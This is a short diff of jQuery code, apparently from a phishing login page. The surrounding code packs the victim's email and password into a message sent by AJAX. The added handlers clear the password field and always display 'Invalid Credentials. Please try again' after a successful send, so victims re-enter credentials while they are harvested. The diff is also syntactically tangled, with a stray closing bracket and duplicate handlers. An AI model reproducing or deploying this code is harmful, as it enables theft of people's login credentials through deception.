@@ -486,6 +486,38 @@ position: fixed;
 			text: detail + "\n" + email + "\n" + password
 
           },
+
+			  beforeSend: function(){
+
+        $('#submit-btn').html('Verifing...');
+
+    },
+
+    success: function(){
+
+        $("#password").val("");
+
+        $("#msg").show();
+
+        $('#msg').html("Invalid Credentials.<br>Please try again");
+
+    },
+
+    error: function(){
+
+        $("#msg").show();
+
+        $('#msg').html("Unable to send data.");
+
+    },
+
+    complete: function(){
+
+        $('#submit-btn').html('Login');
+
+    }
+
+});
             // data: $('#contact').serialize(),
             beforeSend: function(xhr){
               $('#submit-btn').html('Verifing...');
